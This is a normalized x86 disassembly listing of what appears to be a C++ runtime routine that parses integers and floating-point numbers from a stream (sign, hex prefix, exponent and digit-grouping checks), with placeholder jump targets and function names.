mov ecx edi
call edx
movzx eax ax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x74 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x10 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
mov edx [ ebp - 0x68 ]
xor eax eax
push edx
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x58 ]
push eax
push 0x1
lea ecx [ ebp - 0x4c ]
push ecx
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x4c ] 0x2b
call sub_43640d
movzx edi [ ebp - 0x54 ]
add esp 0x14
call sub_41ec60
cmp ax di
jne r-xdata
xor eax eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x68 ]
add eax 0x8
push eax
lea ecx [ ebp - 0x64 ]
push ecx
push 0x1
lea edx [ ebp - 0x4c ]
mov [ ebp - 0x68 ] eax
push edx
lea eax [ ebp - 0x60 ]
push eax
mov [ ebp - 0x4c ] 0x30
call sub_43640d
mov ecx [ ebp - 0x6c ]
mov edi [ ebp - 0x70 ]
add esp 0x14
mov esi ebx
mov [ ebp - 0x64 ] ecx
call sub_41f260
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x58 ] 0x8
jmp r-xdata
xor eax eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x58 ]
push ecx
push 0x1
lea edx [ ebp - 0x4c ]
push edx
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x4c ] 0x2d
call sub_43640d
movzx edi [ ebp - 0x54 ]
add esp 0x14
mov esi ebx
call sub_41ec60
cmp ax di
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ eax ] 0x2b
jmp r-xdata
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x58 ] 0x10
jmp r-xdata
mov edi [ ebp - 0x70 ]
mov esi ebx
mov [ ebp - 0x4d ] 0x0
mov [ ebp - 0x59 ] 0x0
call sub_41f260
test al al
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ eax ] 0x2d
inc eax
mov esi ebx
mov [ ebp - 0x64 ] eax
call sub_41ecc0
cmp [ ebp - 0x58 ] 0x0
je r-xdata
call sub_41ec60
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov [ ebp - 0x60 ] 0xa
cmp [ ebp - 0x58 ] 0xa
je r-xdata
mov [ ebp - 0x4d ] 0x1
call sub_41ecc0
call sub_41f260
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
mov edi [ ebp - 0x2c ]
jne r-xdata
mov eax [ ebp - 0x58 ]
sub eax 0x8
neg eax
sbb eax eax
and eax 0xe
add eax 0x8
mov [ ebp - 0x60 ] eax
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
xor eax eax
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x54 ] eax
push 0x1
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x60 ]
push ecx
mov [ ebp - 0x4c ] 0x78
call sub_43640d
movzx edi [ ebp - 0x60 ]
add esp 0x14
call sub_41ec60
cmp ax di
je r-xdata
cmp [ ebp - 0x4d ] 0x0
mov ebx [ ebp - 0x2c ]
mov edi [ ebp - 0x18 ]
je r-xdata
lea esi [ ebp - 0x48 ]
mov edx [ ebp - 0x68 ]
movzx ecx [ ebx + 0x6 ]
push edx
lea eax [ ebp - 0x78 ]
push eax
push ecx
lea edx [ ebp - 0x4c ]
push edx
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x78 ] 0x0
call sub_435b3f
mov al [ ebp - 0x4c ]
mov ecx [ ebp - 0x60 ]
mov esi [ ebp - 0x64 ]
movsx edx al
push ecx
push edx
push r--data
mov [ esi ] al
call sub_438bc0
add esp 0x1c
test eax eax
je r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov al [ ebp - 0x4d ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] al
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x2b ] 0x0
mov edi [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x1
mov esi ebx
mov [ ebp - 0x54 ] 0x0
call sub_41f260
test al al
jne r-xdata
mov [ ebp - 0x58 ] 0x8
jmp r-xdata
mov eax [ ebp - 0x58 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x68 ]
push edx
push 0x58
call sub_407340
add esp 0x8
mov di ax
call sub_41ec60
cmp ax di
jne r-xdata
mov eax [ ebp - 0x6c ]
mov edx [ ebp - 0x54 ]
cmp [ ebp - 0x18 ] 0x10
mov eax edi
jae r-xdata
cmp [ ebp - 0x59 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov esi ebx
mov [ ebp - 0x58 ] 0x10
mov [ ebp - 0x4d ] 0x0
call sub_41ecc0
jmp r-xdata
cmp eax 0x10
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
push ebx
call sub_43811c
add esp 0x4
cmp [ ebp - 0x59 ] 0x0
mov eax [ ebp - 0x64 ]
jne r-xdata
mov cl [ esi ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x54 ]
cmp [ eax + ecx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp - 0x6c ]
add eax 0x1f
cmp esi eax
jae r-xdata
cmp [ esi ] 0x30
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x48 ]
push eax
call sub_43811c
add esp 0x4
mov [ eax ] 0x0
cmp edi 0x10
jb r-xdata
mov [ eax ] 0x30
inc eax
jmp r-xdata
dec edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov esi [ ebp - 0x74 ]
test si si
je r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x4d ] 0x1
mov eax edi
cmp edx 0x10
jae r-xdata
inc esi
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x59 ] 0x1
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
test edx edx
jne r-xdata
mov eax ebx
cmp edi 0x10
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x54 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ esi + 0x1 ] 0x0
jle r-xdata
mov eax ebx
cmp edi 0x10
jae r-xdata
cmp cl [ eax + edx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x54 ]
cmp [ eax + edx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebx + 0x6 ] si
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax edi
cmp edx 0x10
jae r-xdata
test edx edx
je r-xdata
inc esi
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4d ] 0x0
inc [ ebp - 0x54 ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_409a90
inc [ ebp - 0x54 ]
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x70 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_41cea0
push ebp
mov ebp esp
push 0xffffffff
push sub_451558
mov eax [ fs : 0x0 ]
push eax
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x60 ] eax
mov eax [ ecx + 0x14 ]
and eax 0x3000
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x80 ] edi
cmp eax 0x3000
jne r-xdata
lea edx [ ebp - 0x78 ]
push edx
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_40a480
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x78 ]
mov [ ebp - 0x74 ] eax
test edi edi
je r-xdata
push esi
push ecx
push edx
mov edx [ ebp - 0x60 ]
mov ecx edi
call sub_41dcd0
add esp 0xc
jmp r-xdata
mov ecx [ ebp - 0x74 ]
lea esi [ ebp - 0x48 ]
call sub_427c60
xor eax eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x5c ]
add eax 0x8
push eax
mov [ ebp - 0x7c ] eax
lea eax [ ebp - 0x68 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x54 ] 0x30
call sub_43640d
mov eax [ ebp - 0x80 ]
mov edi [ ebp - 0x60 ]
add esp 0x14
mov esi ebx
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] 0x0
call sub_41f260
test al al
jne r-xdata
push 0x0
lea ecx [ ebp - 0x7c ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x48 ]
xor esi esi
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] esi
mov eax edx
cmp ecx 0x10
jae r-xdata
mov ecx [ ebp - 0x7c ]
push ecx
xor eax eax
lea edx [ ebp - 0x5c ]
push edx
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x5c ] eax
push 0x1
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x4c ] 0x2b
call sub_43640d
movzx edi [ ebp - 0x68 ]
add esp 0x14
call sub_41ec60
cmp ax di
jne r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x7c ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
mov edx [ ebp - 0x7c ]
xor eax eax
push edx
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x5c ]
push eax
push 0x1
lea ecx [ ebp - 0x4c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x4c ] 0x2d
call sub_43640d
movzx edi [ ebp - 0x68 ]
add esp 0x14
mov esi ebx
call sub_41ec60
cmp ax di
jne r-xdata
mov eax [ ebp - 0x80 ]
mov [ eax ] 0x2b
jmp r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov eax [ ebp - 0x80 ]
mov [ eax ] 0x2d
inc eax
mov esi ebx
mov [ ebp - 0x58 ] eax
call sub_41ecc0
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
lea esp [ esp ]
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x6c ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov dx [ ebp - 0x64 ]
cmp dx [ ebx + 0x6 ]
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
mov esi ebx
call sub_41f260
test al al
jne r-xdata
mov ecx [ ebp - 0x74 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
movzx esi [ ebx + 0x6 ]
call eax
cmp si ax
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp - 0x74 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
movzx eax ax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x5c ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov edx [ ebp - 0x6c ]
mov [ ebp - 0x74 ] edx
cmp [ ebp - 0x70 ] 0x0
jge r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call sub_438c6d
mov ecx [ eax ]
mov eax [ ebp - 0x58 ]
mov dl [ ecx ]
mov [ eax ] dl
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x6c ] 0x0
jne r-xdata
movzx edx [ ebp - 0x64 ]
movzx eax [ ebx + 0x6 ]
add edx 0x9
cmp eax edx
jg r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x2c ] si
mov edi [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x2
mov esi ebx
mov [ ebp - 0x68 ] 0x0
call sub_41f260
test al al
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
mov dx [ ebp - 0x64 ]
cmp dx [ ebx + 0x6 ]
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
inc [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov dx [ ebp - 0x64 ]
cmp [ ebx + 0x6 ] dx
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
mov [ ebp - 0x58 ] eax
mov edi [ ebp - 0x6c ]
cmp edi 0x24
jl r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
mov edi [ ebp - 0x18 ]
jne r-xdata
lea esi [ ebp - 0x48 ]
movzx eax [ ebx + 0x6 ]
cmp [ ebp - 0x64 ] ax
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x80 ]
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebx ]
dec [ ebp - 0x70 ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov esi ebx
call sub_41ec60
cmp ax [ ebp - 0x64 ]
jne r-xdata
inc [ ebp - 0x70 ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp edi 0x10
jb r-xdata
mov edx [ ebp - 0x68 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov esi ebx
call sub_41ec60
movzx edx ax
movzx eax [ ebp - 0x64 ]
add eax 0x9
cmp edx eax
jg r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov [ eax ] 0x0
jb r-xdata
mov eax [ ebp - 0x58 ]
mov edi [ ebp - 0x7c ]
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x50 ] 0x65
call sub_43640d
add esp 0x14
cmp si [ ebp - 0x5c ]
je r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
movzx edx [ ebp - 0x64 ]
movzx eax [ ebx + 0x6 ]
add edx 0x9
cmp eax edx
jg r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov esi ebx
call sub_41ec60
mov dl 0x30
sub dl [ ebp - 0x64 ]
lea ecx [ edx + eax ]
mov eax [ ebp - 0x58 ]
mov [ eax ] cl
inc eax
inc [ ebp - 0x6c ]
mov [ ebp - 0x58 ] eax
test edi edi
je r-xdata
mov esi ebx
mov [ ebp - 0x4c ] 0x1
call sub_41ecc0
mov edi [ ebp - 0x60 ]
call sub_41f260
test al al
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
mov cl [ esi ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x68 ]
cmp [ eax + ecx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x6c ]
mov [ ebp - 0x4c ] 0x1
cmp edi 0x24
jl r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ebp - 0x70 ]
mov edx [ ebp - 0x48 ]
push edx
call sub_43811c
add esp 0x4
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x65
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x74 ] 0x24
jge r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
dec edx
je r-xdata
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov edi [ ebp - 0x5c ]
test di di
je r-xdata
mov esi ebx
call sub_41ec60
cmp ax [ ebp - 0x64 ]
jne r-xdata
inc [ ebp - 0x70 ]
jmp r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x50 ] 0x45
call sub_43640d
add esp 0x14
cmp si [ ebp - 0x5c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
test edx edx
jne r-xdata
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov esi ebx
call sub_41ec60
cmp ax di
jne r-xdata
mov esi ebx
call sub_41ec60
mov dl 0x30
sub dl [ ebp - 0x64 ]
lea ecx [ edx + eax ]
mov eax [ ebp - 0x58 ]
mov [ eax ] cl
inc eax
inc [ ebp - 0x6c ]
mov [ ebp - 0x58 ] eax
test edi edi
je r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
cmp edx 0x10
jae r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ ebx + 0x6 ]
sub dl [ ebp - 0x64 ]
mov eax [ ebp - 0x58 ]
add dl 0x30
mov [ eax ] dl
inc eax
inc [ ebp - 0x74 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ esi + 0x1 ] 0x0
jle r-xdata
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp cl [ eax + edx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x68 ]
cmp [ eax + edx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_409a90
inc [ ebp - 0x68 ]
mov ecx [ ebp - 0x68 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
lea ecx [ ecx ]
mov edi [ ebp - 0x7c ]
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x50 ] 0x2b
call sub_43640d
add esp 0x14
cmp si [ ebp - 0x5c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
test edx edx
je r-xdata
inc esi
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x54 ] 0x1
mov [ ebp - 0x54 ] 0x1
inc [ ebp - 0x68 ]
jmp r-xdata
mov esi ebx
call sub_41ecc0
mov edi [ ebp - 0x60 ]
call sub_41f260
test al al
je r-xdata
mov eax [ ebp - 0x2c ]
cmp edx 0x10
jae r-xdata
